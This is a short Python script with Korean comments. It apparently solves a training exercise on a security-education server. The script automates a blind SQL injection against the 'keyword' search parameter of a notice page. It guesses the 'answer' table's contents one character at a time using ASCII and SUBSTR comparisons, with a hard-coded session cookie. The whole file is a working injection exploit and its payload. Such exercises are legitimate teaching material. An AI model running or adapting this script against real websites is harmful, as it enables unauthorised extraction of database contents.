import requests

url = 'http://elms2.skinfosec.co.kr:8083/exam5/notice.php'
# Cookie 값은 로그인 후 변경 필요
cookie = {'PHPSESSID': 'D822081f6f3abb20807f9f2cb1393e432'}

# 문제 : 같은 구간에서 블라인드 인젝션이 발생한다. 해당 구간에서 answer 테이블의 데이터에서 정답을 찾으시오. (DB명은 SKINFOSEC, 테이블명 answer, 단일 칼럼이며 데이터는 5글자 이내임)
# 쿼리문 탐색
# aaa' AND ASCII(SUBSTR((SELECT * FROM answer),1,1)) < 130 AND '%1%'='%1

def find_target():

    find_value = ""

    for i in range(5):
        
        for ascii in range(48, 122):
            param = {"pageIndex": "1", "board_id": "", "sorting": "", "sotingAd": "DESC", "searchType": "all", "keyword": "aaa' AND ASCII(SUBSTR((SELECT * FROM answer),{},1)) = {} AND '%1%'='%1".format(i+1, ascii)}
            print(param)
            # GET방식으로 전송하므로 requests.get로 전달해야 한다.
            Send = requests.get(url, params = param, cookies = cookie)
            if "AAAAAAAAAAAAAAAAAAAAAAAAAAA" in Send.text:
                print("user의 값은: ",chr(ascii))
                find_value += chr(ascii)
                break
            print("값을 찾고있습니다!",chr(ascii))
    print("User의 이름은:", find_value, "입니다.")

find_target()

